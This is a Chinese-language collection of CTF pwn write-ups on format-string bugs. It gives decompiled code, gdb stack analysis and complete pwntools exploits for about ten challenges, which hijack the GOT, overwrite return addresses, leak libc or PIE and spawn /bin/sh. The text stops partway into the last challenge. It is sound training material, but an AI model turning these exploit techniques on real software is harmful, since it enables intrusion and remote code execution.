00000000 10 a0 04 08 11 a0 04 08 12 a0 04 08 13 a0 04 08 │····│····│····│····│ 00000010 25 32 34 30 63 25 37 24 68 68 6e 25 31 33 32 63 │%240│c%7$│hhn%│132c│ 00000020 25 38 24 68 68 6e 25 31 32 38 63 25 39 24 68 68 │%8$h│hn%1│28c%│9$hh│ 00000030 6e 25 34 63 25 31 30 24 68 68 6e 0a │n%4c│%10$│hhn·││ 0000003c 可以看一下其生成的payload，把目标地址信息放在开头，在64位是肯定是不可行的。 jarvisoj_fmida分析int __cdecl main(int argc, const char **argv, const char **envp) { char buf; // [esp+2Ch] [ebp-5Ch] unsigned int v5; // [esp+7Ch] [ebp-Ch] v5 = __readgsdword(0x14u); be_nice_to_people(); memset(&amp;buf, 0, 0x50u); read(0, &amp;buf, 0x50u); printf(&amp;buf); printf(&quot;%d!\\n&quot;, *(_DWORD *)&amp;x); if ( *(_DWORD *)&amp;x != 4 ) return 0; puts(&quot;running sh...&quot;); system(&quot;/bin/sh&quot;); return 0; } 十分简单的题目，检验 x 值是否为4，如果是4（数字），就直接给你shell了。 expfrom pwn import * context.log_level = &#39;debug&#39; # io = process(&#39;./fm&#39;) io = remote(&#39;node3.buuoj.cn&#39;,26915) # io.recv() payload = p32(0x0804A02C) + &#39;%11$hn&#39; raw_input(&#39;-&gt;&#39;) io.sendline(payload) io.interactive() winesap_week6源码：#include &lt;stdio.h&gt; int main() { setvbuf(stdout, 0, _IONBF, 0); alarm(180); char str[100]; while(gets(str)) { printf(str); } return 0; } 需要编译为64位，这个题比起来第一个也就是没有了system函数，需要自己泄漏一下libc的base，算出system地址，然后还是GOT hijack就可以了。 EXPfrom pwn import * import time context.arch = &#39;amd64&#39; context.log_level = &#39;debug&#39; io = process(&#39;./fmt1&#39;) elf = ELF(&#39;./fmt1&#39;) libc = elf.libc printf_got = 0x0000601020 io.sendline(&#39;%21$p&#39;) io.recvuntil(&#39;0x&#39;) libc_base = int((io.recv(12)),16) - 240 -libc.symbols[&#39;__libc_start_main&#39;] system_addr = libc_base + libc.symbols[&#39;system&#39;] print(&#39;leak_libc_base: &#39; + hex(libc_base)) print(&#39;system_addr: &#39; + hex(system_addr)) def fmt_short(prev,val,idx,byte = 2): result = &quot;&quot; if prev &lt; val : result += &quot;%&quot; + str(val - prev) + &quot;c&quot; elif prev == val : result += &#39;&#39; else : result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot; result += &quot;%&quot; + str(idx) + &quot;$hn&quot; return result prev = 0 payload = &quot;&quot; key = system_addr for i in range(3): payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,12+i) prev = (key &gt;&gt; i*16) &amp; 0xffff payload = payload.ljust(0x30,&#39;a&#39;) + p64(printf_got) +p64(printf_got+2) + p64(printf_got+4) io.sendline(payload) sleep(1) io.sendline(&#39;/bin/sh\\x00&#39;) io.interactive() HITCON-Training-lab8源码#include &lt;stdio.h&gt; int magic = 0 ; int main(){ char buf[0x100]; setvbuf(stdout,0,2,0); puts(&quot;Please crax me !&quot;); printf(&quot;Give me magic :&quot;); read(0,buf,0x100); printf(buf); if(magic == 0xda){ system(&quot;cat /home/craxme/flag&quot;); }else if(magic == 0xfaceb00c){ system(&quot;cat /home/craxme/craxflag&quot;); }else{ puts(&quot;You need be a phd&quot;); } } 编译为64位。 分析（这个题目是纯粹就是为了练习任意地址写入的，我这里就直接写exp拿sheel了。）可以看到当再一次printf，之后程序便停止了，且结束前有puts函数。思路就是可以GOT hijack put函数的GOT为read函数哪里，让其call puts函数时返回到read函数，并且在这次printf函数漏洞利用时，也把printf函数的GOT改为system的plt，然后传入/bin/sh即可。 expfrom pwn import * context.log_level = &#39;debug&#39; context.arch = &#39;amd64&#39; io = process(&#39;./craxme&#39;) # io = remote(&#39;127.0.0.1&#39;,8888) magic = 0x0000060106C io.recvuntil(&#39;:&#39;) system_plt = 0x04005A0 puts_got = 0x0601018 ret_addr = 0x00400747 printf_got = 0x00601030 key = 0x00400747 key2 = 0x04005A0 def fmt_short(prev,val,idx,byte = 2): result = &quot;&quot; if prev &lt; val : result += &quot;%&quot; + str(val - prev) + &quot;c&quot; elif prev == val : result += &#39;&#39; else : result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot; result += &quot;%&quot; + str(idx) + &quot;$hn&quot; return result prev = 0 payload = &quot;&quot; for i in range(3): payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,26+i) prev = (key &gt;&gt; i*16) &amp; 0xffff for i in range(3): payload +=fmt_short(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,29+i) prev = (key2 &gt;&gt; i*16) &amp; 0xffff payload = payload.ljust(0x80+0x20,&#39;a&#39;) + flat([puts_got,puts_got+2,puts_got+4,printf_got,printf_got+2,printf_got+4]) io.sendline(payload) io.interactive() cacti-pwn3保护和arch[*] &#39;/media/psf/mypwn2/ctf_wiki/fmt/cctf/pwn3&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ida分析这个题模拟了一个ftp服务。这里控制的是登陆。进入分析一下： char *__cdecl ask_username(char *dest) { char src[40]; // [esp+14h] [ebp-34h] int i; // [esp+3Ch] [ebp-Ch] puts(&quot;Connected to ftp.hacker.server&quot;); puts(&quot;220 Serv-U FTP Server v6.4 for WinSock ready...&quot;); printf(&quot;Name (ftp.hacker.server:Rainism):&quot;); __isoc99_scanf(&quot;%40s&quot;, src); for ( i = 0; i &lt;= 39 &amp;&amp; src[i]; ++i ) ++src[i]; return strcpy(dest, src); } 用户名函数，发现对你输入的东西进行诸位的进行加一。 int __cdecl ask_password(char *s1) { if ( !strcmp(s1, &quot;sysbdmin&quot;) ) return puts(&quot;welcome!&quot;); puts(&quot;who you are?&quot;); exit(1); return puts(&quot;welcome!&quot;); } 用户密码函数，发现要跟sysbdmin 进行对比，如果不相等，就直接退出。(strcmp函数对比两个字符串时，相等返回0，!0 = 非假 = 真）所以这个绕过就时sysbdmin 诸位减1即可。剩下的就是输入get put dir,会进入不同的分支，其中输入get函数： int get_file() { char dest; // [esp+1Ch] [ebp-FCh] char s1; // [esp+E4h] [ebp-34h] char *i; // [esp+10Ch] [ebp-Ch] printf(&quot;enter the file name you want to get:&quot;); __isoc99_scanf(&quot;%40s&quot;, &amp;s1); if ( !strncmp(&amp;s1, &quot;flag&quot;, 4u) ) puts(&quot;too young, too simple&quot;); for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) ) { if ( !strcmp(i, &amp;s1) ) { strcpy(&amp;dest, i + 40); return printf(&amp;dest); } } return printf(&amp;dest); } 这个函数是有格式化字符串漏洞的，当你put上去一个文件，它会让你输入文件名字和文件内容，然后get这个函数会根据文件名字，来输出其内容，利用这两个函数搭配一下就可以实现格式化字符串漏洞的利用了。并且在dir中，其会输出一个文件的名字，用的是puts函数。然后就有思路利用了： 由于没有system函数，然后就需要想办法泄漏一下libc地址，来算出system的函数在libc的地址。 修改puts函数的got为system的地址，然后记得这个文件的名称是/bin/sh,这样在使用dir调用puts函数时，就可以拿到shell了。这题比较有趣，有点难在分析这个程序在干嘛，利用思路倒是不难。 expfrom pwn import * context.log_level = &#39;debug&#39; context.arch = &#39;i386&#39; io = process(&#39;./pwn3&#39;) elf = ELF(&#39;./pwn3&#39;) libc = elf.libc s = &#39;sysbdmin&#39; key = &#39;&#39; for i in s: key+=chr(ord(i)-1) print(key) io.sendline(key) info(&#39;---------leak libc_base--------&#39;) io.recvuntil(&#39;&gt;&#39;) io.sendline(&#39;put&#39;) io.recvuntil(&#39;upload:&#39;) io.sendline(&#39;1111&#39;) puts_got = elf.got[&#39;puts&#39;] io.sendline(&#39;%8$s&#39; + p32(puts_got) ) io.recvuntil(&#39;&gt;&#39;) io.sendline(&#39;get&#39;) io.recvuntil(&#39;get:&#39;) io.sendline(&#39;1111&#39;) puts_addr = u32(io.recv(4)[:4]) print(&#39;puts_add:&#39; + hex(puts_addr)) sys_addr = puts_addr - libc.symbols[&#39;puts&#39;] + libc.symbols[&#39;system&#39;] io.recvuntil(&#39;&gt;&#39;) info(&#39;---------hijack puts_got--------&#39;) io.sendline(&#39;put&#39;) io.recvuntil(&#39;upload:&#39;) io.sendline(&#39;/bin/sh;&#39;) payload = fmtstr_payload(7,{puts_got: sys_addr}) io.sendline(payload) io.recvuntil(&#39;&gt;&#39;) io.sendline(&#39;get&#39;) io.recvuntil(&#39;get:&#39;) info(&#39;--------- get shell-------&#39;) io.sendline(&#39;/bin/sh;&#39;) io.recvuntil(&#39;&gt;&#39;) io.sendline(&#39;dir&#39;) io.interactive() 三个白帽 - pwnme_k0保护和arch[*] &#39;/media/psf/mypwn2/ctf_wiki/fmt/sgbm_pwnme/pwnme_k0&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 开启了RELRO，这样就无法修改got了。 ida分析程序实现了一个注册用户的功能，注册好后可以来展示用户信息，修改用户信息，和退出。其中在展示用户信息当中，存在格式化字符串漏洞： int __fastcall sub_400B07(char format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, char formata, __int64 a8, __int64 a9) { write(0, &quot;Welc0me to sangebaimao!\\n&quot;, 0x1AuLL); printf(&amp;formata, &quot;Welc0me to sangebaimao!\\n&quot;); return printf(&amp;a9 + 4); } 其中发现其输出的buf就是你输入的密码：并且还发现其中有个后门函数，会调用system函数给你shell，就可以去修改程序的返回地址，直接返回到这里就拿到shell了。Gdb调试定位关键在这个printf当中，确定一下： 看一下此时的栈情况，输入的usename可以确定偏移是8，rdi也是指向了存放password的地址。并且发现栈上也有很多栈的地址信息，当第二次运行到这里的时候，这里esp对应的地址信息也是不会变的，所以就可以通过泄漏这里的值来算出ret address，然后修改用户信息，这下把ret address的point放到栈上，接着就开始修改ret address的值了。 expfrom pwn import * context.log_level = &#39;debug&#39; context.arch = &#39;amd64&#39; io = process(&#39;./pwnme_k0&#39;) # context.clear(arch = &#39;amd64&#39;) io.recvuntil(&#39;lenth:20): \\n&#39;) io.sendline(&#39;%0006$lx&#39;) io.recvuntil(&#39;lenth:20): \\n&#39;) io.sendline(&#39;11111111&#39;) io.recvuntil(&#39;&gt;&#39;) io.sendline(&#39;1&#39;) # io.recvuntil(&#39;Welc0me to sangebaimao!\\n&#39;) stack = int(io.recvline_contains(&#39;7f&#39;),16) print(stack) ret_add = stack - 0x38 # system_add = 0x04008AA payload = &#39;%2218c%8$hn&#39; io.recvuntil(&#39;&gt;&#39;) io.sendline(&#39;2&#39;) io.recvuntil(&#39;lenth:20): \\n&#39;) io.sendline(p64(ret_add)) io.recvuntil(&#39;lenth:20): \\n&#39;) io.sendline(payload) io.recvuntil(&#39;&gt;&#39;) io.sendline(&#39;1&#39;) io.interactive() inndy-echo2保护和arch[*] &#39;/media/psf/mypwn2/buuctf/inndy_echo2/echo2&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled 可以看到开启了pie，这时候就需要来泄漏一下pie的基地址。 ida分析void __noreturn echo() { char s; // [rsp+0h] [rbp-110h] unsigned __int64 v1; // [rsp+108h] [rbp-8h] v1 = __readfsqword(0x28u); do { fgets(&amp;s, 256, stdin); printf(&amp;s, 256LL); } while ( strcmp(&amp;s, &quot;exit\\n&quot;) ); system(&quot;echo Goodbye&quot;); exit(0); } 代码是比较简单的，还是got hijack 就行了。难点也是如何来处理这个pie保护。 gdb 调试=&gt; 0x555555554984 &lt;echo+68&gt;: call 0x5555555547a0 &lt;printf@plt&gt; 0x555555554989 &lt;echo+73&gt;: lea rax,[rbp-0x110] 0x555555554990 &lt;echo+80&gt;: lea rsi,[rip+0xfd] # 0x555555554a94 0x555555554997 &lt;echo+87&gt;: mov rdi,rax 0x55555555499a &lt;echo+90&gt;: call 0x5555555547d0 &lt;strcmp@plt&gt; 找到关键点，然后看一下栈情况： 0192| 0x7fffffffe1c0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad2087 --More--(25/48) 0200| 0x7fffffffe1c8 --&gt; 0x7ffff7a88947 (&lt;_IO_default_setbuf+23&gt;: cmp eax,0xffffffff) 0208| 0x7fffffffe1d0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad2087 0216| 0x7fffffffe1d8 --&gt; 0x7ffff7fd8700 (0x00007ffff7fd8700) 0224| 0x7fffffffe1e0 --&gt; 0x555555554810 (&lt;_start&gt;: xor ebp,ebp) 0232| 0x7fffffffe1e8 --&gt; 0x7ffff7a85439 (&lt;_IO_new_file_setbuf+9&gt;: test rax,rax) 0240| 0x7fffffffe1f0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad2087 发现在0x7fffffffe1e0这里就可以泄漏出pie基址了，确定偏移是34。然后剩下的就简单了，直接ida里面查看下plt和got ，加上以后就得到了真正的plt和got地址。 expfrom pwn import * context.log_level = &#39;debug&#39; context.arch = &#39;amd64&#39; io = process(&#39;./echo2&#39;) # io = remote(&#39;node3.buuoj.cn&#39;,28200) def leak1(): io.sendline(&#39;%34$p&#39;) io.recvuntil(&#39;0x&#39;) p_bass_addr = int((io.recv(9)+&#39;000&#39;),16) return p_bass_addr p_bass_addr = leak1() print(&#39;p_bass_addr -&gt;&#39; + hex(p_bass_addr)) print_got = 0x201020 + p_bass_addr print(&#39;print_got -&gt;&#39; + hex(print_got)) system_plt = 0x790 + p_bass_addr print(&#39;system_plt -&gt;&#39; + hex(system_plt)) def fmt(prev,val,idx,byte = 2): result = &quot;&quot; if prev &lt; val : result += &quot;%&quot; + str(val - prev) + &quot;c&quot; elif prev == val : result += &#39;&#39; else : result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot; result += &quot;%&quot; + str(idx) + &quot;$hn&quot; return result prev = 0 payload = &quot;&quot; key = system_plt for i in range(3): payload +=fmt(prev,(key &gt;&gt; 16*i) &amp; 0xffff,14+i) prev = (key &gt;&gt; i*16) &amp; 0xffff payload = payload.ljust(0x40,&#39;a&#39;) + flat([print_got,print_got+2,print_got+4]) # raw_input(&#39;-&gt;&#39;) io.sendline(payload) sleep(0.1) io.sendline(&#39;/bin/sh\\x00&#39;) io.interactive() -— ** 接下来的题，都是buf不再栈的上的题目。** plaidctf2015-ebp保护和arch[*] &#39;/media/psf/mypwn2/buuctf/plaidctf2015_ebp/ebp&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 可以看到nx保护是关闭的，可以想办法利用shellcode。 ida分析int __cdecl main(int argc, const char **argv, const char **envp) { int result; // eax while ( 1 ) { result = (int)fgets(buf, 1024, stdin); if ( !result ) break; echo(); } return result; } 漏洞函数： int make_response() { return snprintf(response, 0x400u, buf); } 代码十分简单，但是这次的漏洞函数变成了snprintf ，时刻注意偏移的计算是针对格式化字符串的偏移。且buf是在bss段上的，已经变得不是我们当初一样十分的好控制，此时就需要想办法好好利用栈上原来有的数据。 gdb调试gdb-peda$ stack 0x20 0000| 0xffffd320 --&gt; 0x804a480 --&gt; 0x0 0004| 0xffffd324 --&gt; 0x400 0008| 0xffffd328 --&gt; 0x804a080 (&quot;AAAA\\n&quot;) 0012| 0xffffd32c --&gt; 0xf7fd31b0 --&gt; 0xf7e00000 --&gt; 0x464c457f 0016| 0xffffd330 --&gt; 0xf7fe77eb (&lt;_dl_fixup+11&gt;: add esi,0x15815) 0020| 0xffffd334 --&gt; 0x0 0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd378 --&gt; 0x0 0028| 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;: mov DWORD PTR [esp],0x804a480) 可以看一下此时的栈情况。可以看到上面有很多可以利用的地址信息，其中最常用的也是ebp链 ： 0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd378 --&gt; 0x0 也就是这一个，第一次可以通过利用0xffffd338（ebp1）这个地址，其指向0xffffd358 （ebp2），然后利用%xc%4$hhn 就可以修改0xffffd378（ebp3）。将0xffffd378 改为指向ret address的栈地址 0xffffd33c ： 0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;: mov DWORD PTR [esp],0x804a480) 0028| 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;: mov DWORD PTR [esp],0x804a480) 改完也就是这样的效果。这样就又可以通过利用 0xffffd358 （ebp2），其指向 0xffffd33c（ebp3），接着就算一下0xffffd358 （ebp2）的偏移 y，然后利用%xc%y$hhn 就可以修改0x804852c（ret address） 这样攻击思路也就出来了，可以修改retaddress ，返回在可控的buf 上面放好shellcode ，控制程序跳到shellcode即可。 expfrom pwn import * import time context.log_level = &#39;debug&#39; context.arch = &#39;i386&#39; io = process(&#39;./ebp&#39;) # io = remote(&#39;node3.buuoj.cn&#39;,29994) buf = 0x0804a080 + 0x40 #0x804a0c0 raw_input(&#39;-&gt;&#39;) io.sendline(&#39;%4$p&#39;) ret_stack_addr = int(io.recv(10),16) - 28 print(&#39;leak ret_stack_addr:&#39;+hex(ret_stack_addr)) key1 = int(str(hex(ret_stack_addr))[-2:],16) key2 = 0xa0c0 payload = &#39;%{}c%4$hhn&#39;.format(key1) raw_input(&#39;-&gt;&#39;) io.sendline(payload) io.recv() payload = &#39;%{}c%12$hn&#39;.format(key2) payload = payload.ljust(0x40) payload += asm(shellcraft.sh()) io.sendline(payload) io.interactive() hitcontraining-playfmt保护和arch[*] &#39;/media/psf/mypwn2/buuctf/hitcontraining_playfmt/playfmt&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments没有任何保护。 ida分析int do_fmt() { int result; // eax while ( 1 ) { read(0, buf, 0xC8u); result = strncmp(buf, &quot;quit&quot;, 4u); if ( !result ) break; printf(buf); } return result; } 上层有play 和 main函数，一共三层，在第三层的这个函数存在格式化字符串漏洞，让我们很方便的用ebp链来做题。然后，有无限次的触发这个漏洞的机会。 攻击思路 ：因为没有开nx保护，也就以为着可以用shellcode进行攻击。然后还是改返回地址，提前在可控的buf合适的地方摆上shellcode，然后跳上去即可。 gdb分析 如图所示，利用这个链即可。先想办法把Oxffffd358 改成 Oxffffd33c : 然后在想办法把0x8048507 这个返回地址改成我们摆放的shellcode的地址即可。 expfrom pwn import * import time context.log_level = &#39;debug&#39; context.arch = &#39;i386&#39; io = process(&#39;./playfmt&#39;) # io = remote(&#39;node3.buuoj.cn&#39;,26382) buf = 0x0804A060 + 0x40 #0x804a0a0 offset1 = 6 offset2 = 10 info(&#39;---leak stack address---&#39;) io.recvuntil(&#39;\\n=====================\\n&#39;) io.sendline(&#39;%10$p&#39;) ret_stack_addr = int(io.recv(10),16) - 28 print(&#39;leak ret_stack_addr:&#39;+hex(ret_stack_addr)) info(&#39;---change the retaddr---&#39;) key = int(str(hex(ret_stack_addr))[-2:],16) payload = &quot;%{}c%6$hhn&quot;.format(key) raw_input(&#39;-&gt;&#39;) io.sendline(payload) sleep(0.1) io.recv() key2 = 0xa0a0 payload = &quot;%{}c%10$hn&quot;.format(key2) payload = payload.ljust(0x40) payload += asm(shellcraft.sh()) raw_input(&#39;-&gt;&#39;) io.sendline(payload) io.recv() sleep(0.1) io.sendline(&#39;quit&#39;) io.interactive() 记得发出去一次payload，一定需要接受一次，再去发第二个payload，防止没有完成一个printf，就让程序接受发送的东西，这样容易崩溃。 pwnable-fsbarch和保护 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)开了nx了。 ida分析 for ( k = 0; k &lt;= 3; ++k ) { printf(&quot;Give me some format strings(%d)\\n&quot;, k + 1); read(0, buf, 0x64u); printf(buf); } puts(&quot;Wait a sec...&quot;); sleep(3u); 可以看到这里控制了可以利用printf函数漏洞的次数，只可以利用4次。 execve(path, &amp;path, 0); 且这一条可以给你拿到shell。 那攻击思路就可以是改掉puts，sleep的got表，到这个拿取shell的位置就行。因为这里下面就调用一次sleep，就改它好了，基本不会出问题。 注意一下这里的汇编代码，其也是让栈的esp处于不定的状态。 gdb分析此时的EBP = 0xffffd228 0000| 0xffffd1e0 --&gt; 0x804a100 (&quot;AAAA\\n&quot;) 0004| 0xffffd1e4 --&gt; 0x804a100 (&quot;AAAA\\n&quot;) 0008| 0xffffd1e8 --&gt; 0x64 (&#39;d&#39;) 0012| 0xffffd1ec --&gt; 0xf7f5b2a2 (&quot;__vdso_clock_gettime&quot;) 0016| 0xffffd1f0 --&gt; 0xf7fe1fc9 (&lt;do_lookup_x+9&gt;: add ebx,0x1b037) 0020| 0xffffd1f4 --&gt; 0x0 0024| 0xffffd1f8 --&gt; 0xf7ffdad0 --&gt; 0xf7ffda74 --&gt; 0xf7fd3470 --&gt; 0xf7ffd918 --&gt; 0x0 0028| 0xffffd1fc --&gt; 0xffffd278 --&gt; 0xf7e0b018 --&gt; 0x3eab 0032| 0xffffd200 --&gt; 0xffffd2c0 --&gt; 0x804a024 --&gt; 0xf7ed6290 (&lt;close&gt;: cmp DWORD PTR gs:0xc,0x0) 0036| 0xffffd204 --&gt; 0x8048870 (&quot;/bin/sh&quot;) 0040| 0xffffd208 --&gt; 0x0 0044| 0xffffd20c --&gt; 0x0 0048| 0xffffd210 --&gt; 0xffffd4a4 --&gt; 0x0 0052| 0xffffd214 --&gt; 0xffffdfce --&gt; 0x656d2f00 (&#39;&#39;) 0056| 0xffffd218 --&gt; 0xffffd230 --&gt; 0x0 0060| 0xffffd21c --&gt; 0xffffd234 --&gt; 0x0 0064| 0xffffd220 --&gt; 0x0 0068| 0xffffd224 --&gt; 0x1 0072| 0xffffd228 --&gt; 0xffffd378 --&gt; 0x0 可以看到，因为这个题是main -&gt; fsb ,用户代码只有2层函数的调用，看这个ebp chain的时候就有点不方便了，我们没有一个完整的chain来使用。这个时候，就只能把ebp3 的值，自己写上去，写上sleep的got然后再改成拿shell的地址就行了。整个过程还是需要泄漏一下栈地址esp，因为其栈是变化的。泄露以后，也获取一下ebp2的值，然后（ebp2- esp ）/4 也就确定到了，main的ebp值（ebp3）对应格式化字符串的偏移值。然后再次利用printf函数根据这个偏移来进行改写sleep got上的值。 expfrom pwn import * import time context.log_level = &#39;debug&#39; context.arch = &#39;i386&#39; io = process(&#39;./fsb&#39;) # s = ssh( # host=&quot;pwnable.kr&quot;, # port=2222, # user=&quot;fsb&quot;, # password=&quot;guest&quot; # ) # io = s.run(&quot;/home/fsb/fsb&quot;) # io = shell.run(&quot;/home/fsb/fsb&quot;) sleep_got = 0x0804a008 info(&#39;--------leak stack base:-------&#39;) io.recvuntil(&#39;strings(1)\\n&#39;) io.sendline(&#39;%14$p&#39;) io.recvuntil(&#39;0x&#39;) stack_base = int(io.recv(8),16) - 80 print(hex(stack_base)) info(&#39;--------leak the point to main ebp:-------&#39;) io.recvuntil(&#39;strings(2)\\n&#39;) io.sendline(&#39;%18$p&#39;) io.recvuntil(&#39;0x&#39;) point = int(io.recv(8),16) print(hex(point)) info(&#39;--------write sleep_got to main_ebp :-------&#39;) io.recvuntil(&#39;strings(3)\\n&#39;) key1 = 0x0804A008 payload = &#39;%&#39; + str(key1) + &#39;c%18$n&#39; io.sendline(payload) info(&#39;--------write tag to sleep_got :-------&#39;) tag = 0x869F offset = (point - stack_base) / 4 payload = &quot;%{}c%&#39;str(offset)&#39;$hn &quot;.format(tag) io.recvuntil(&#39;strings(4)\\n&#39;) io.sendline(payload) io.interactive() inndy-echo3保护和arch Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000)ida分析这一处会让栈的情况变得无法预测。然后进入hardfmt： for ( i = 0; i &lt;= 4; ++i ) { read(0, buff, 0x1000u); printf(buff); } 这一处存在漏洞，且往下看感觉没什么好利用的，没什么漏洞函数。那攻击思路就是：改printf的got表，然后在第5次传过去/bin/sh即可。（这个题目思路还是很简单的，但是因为这个次数的限制，在实际操作过程中，要充分的利用每一次格式化字符串漏洞。） gdb分析因为栈情况不一样，可以选择最适合我们利用漏洞的栈空间，这样做起来会简单一些。 我自己选择在偏移在43的时候开始进行分析，想办法来利用这个漏洞： 仔细看下此时的栈情况 ，然后再次分析下我们的目标 ： 泄漏libc基址，计算出system的内存地址。 在栈上构造出printf的got地址和printf的got地址+2的地址（0x0804a014和0x0804a016） 在构造的got地址上，开始写system地址 由于这个漏洞可以的用的次数最多是4次，所以要尽可能利用每一次。如上图所示，很简单就可以泄漏出libc基址。但是接下来怎么构造printf的got地址和printf的got地址+2的地址就有点难了。 此时注意图上前两个框框，可以发现把第二个框框的两个地址修改为 第一个框框的栈指针： gdb-peda$ set *0xffbe5e6c = 0xffbe5d54 gdb-peda$ set *0xffbe5e64 = 0xffbe5d60这个过程在泄漏目标栈地址以后，也是可以通过一次printf函数写入2次地址，实现这个栈情况的。 接着就可以构造got地址： gdb-peda$ set *0xffbe5d60 = 0x0804a016 gdb-peda$ set *0xffbe5d54 = 0x0804a014 然后就可以写system的内存地址上got了： 0120| 0xffbe5d88 --&gt; 0xffbe5e6c --&gt; 0xffbe5d54 --&gt; 0x804a014 --&gt; 0xf7e0cda0 (&lt;__libc_system&gt;: sub esp,0xc)这样再传过去一下/bin/sh即可。 expfrom pwn import * context.log_level = &#39;debug&#39; context.arch =&#39;i386&#39; import time elf = ELF(&#39;./echo3&#39;) debug = 1 while True: if debug : io = process(&#39;./echo3&#39;) libc = elf.libc else: io = remote(&#39;node3.buuoj.cn&#39;,25057) libc = ELF(&#39;./libc-2.23.so.i386&#39;) payload = &#39;%43$pA%30$pA%47$p&#39; io.sendline(payload) address = io.recvline().strip() if address[-3:] == &#39;637&#39;: if address[7:10] == &#39;637&#39;: libc_base = int(address[2:10],16) - 247 - libc.symbols[&#39;__libc_start_main&#39;] tag1_stack_point = int(address[13:21],16) - 0x118 tag2_stack_point = int(address[13:21],16) - 0x104 - 0x8 system_addr = libc_base + libc.symbols[&#39;system&#39;] print(&#39;system_addr -&gt;&#39; + hex(system_addr)) print(&#39;tag1_stack_point -&gt;&#39; + hex(tag1_stack_point)) print(&#39;tag2_stack_point -&gt;&#39; + hex(tag2_stack_point)) break else : io.close() continue # io = def fmtshort(prev,val,idx,byte = 2): result = &quot;&quot; if prev &lt; val : result += &quot;%&quot; + str(val - prev) + &quot;c&quot; elif prev == val : result += &#39;&#39; else : result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot; result += &quot;%&quot; + str(idx) + &quot;$hn&quot; return result def fmtbyte(prev,val,idx,byte = 1): result = &quot;&quot; if prev &lt; val : result += &quot;%&quot; + str(val - prev) + &quot;c&quot; elif prev == val : result += &#39;&#39; else : result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot; result += &quot;%&quot; + str(idx) + &quot;$hhn&quot; return result printf_got = 0x0804a014 key1 = int(hex(tag1_stack_point)[-4:],16) key2 = int(hex(tag2_stack_point)[-4:],16) info(&#39;--------change the two points to tag_stack_point:-------&#39;) # raw_input(&#39;-&gt;&#39;) prev = 0 payload = &quot;&quot; for i in range(1): payload +=fmtshort(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,30+i) prev = (key1 &gt;&gt; i*16) &amp; 0xffff for i in range(1): payload +=fmtshort(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,31+i) prev = (key2 &gt;&gt; i*16) &amp; 0xffff payload = payload + &#39;1111&#39; raw_input(&#39;-&gt;&#39;) io.sendline(payload) io.recvuntil(&#39;1111&#39;) info(&#39;--------change got_table to printf_got:-------&#39;) raw_input(&#39;-&gt;&#39;) prev = 0 payload = &quot;&quot; key3 = 0x14 key4 = 0x16 for i in range(1): payload +=fmtbyte(prev,(key3 &gt;&gt; 8*i) &amp; 0xff,87+i) prev = (key3 &gt;&gt; i*8) &amp; 0xff for i in range(1): payload +=fmtbyte(prev,(key4 &gt;&gt; 8*i) &amp; 0xff,85+i) prev = (key4 &gt;&gt; i*8) &amp; 0xff payload = payload + &#39;2222&#39; io.sendline(payload) io.recvuntil(&#39;2222&#39;) info(&#39;--------change printf_got to system_addr:-------&#39;) raw_input(&#39;-&gt;&#39;) prev = 0 payload = &quot;&quot; key5 = int(hex(system_addr)[-4:],16) key6 = int(hex(system_addr)[2:6],16) print(&#39;key5 -&gt; &#39; + hex(key5)) print(&#39;key6 -&gt; &#39; + hex(key6)) for i in range(1): payload +=fmtshort(prev,(key5 &gt;&gt; 16*i) &amp; 0xffff,17+i) prev = (key5 &gt;&gt; i*16) &amp; 0xffff for i in range(1): payload +=fmtshort(prev,(key6 &gt;&gt; 16*i) &amp; 0xffff,20+i) prev = (key6 &gt;&gt; i*16) &amp; 0xffff payload = payload + &#39;3333&#39; io.sendline(payload) sleep(1) io.recvuntil(&#39;3333&#39;) raw_input(&#39;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&#39;) io.sendline(&#39;/bin/sh\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#39;) io.interactive() 这个exp的难点在于： 注意去定位到合适的栈结构再去利用 尽量充分利用每一次的printf 单次printf多次写入 注意每次传数据过去后，一定要接收一下，并且再一次的数据读入要防止bss上的缓冲区里面参杂数据的影响。结论和收获 这个题教会我一定要灵活、充分的利用栈上的数据,单纯的ebp链只是适合简单的情况。还有就是面对这种会有随机栈情况的题目，尽量要注意本地和远程的ibc版本、注意环境,这些不一样导致栈的情况也是不一样的，导致exp也要有相应的变化。 xman-2019-format保护和archCANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partialida分析char *__cdecl sub_80485C4(char *s) { char *v1; // eax char *result; // eax puts(&quot;...&quot;); v1 = strtok(s, 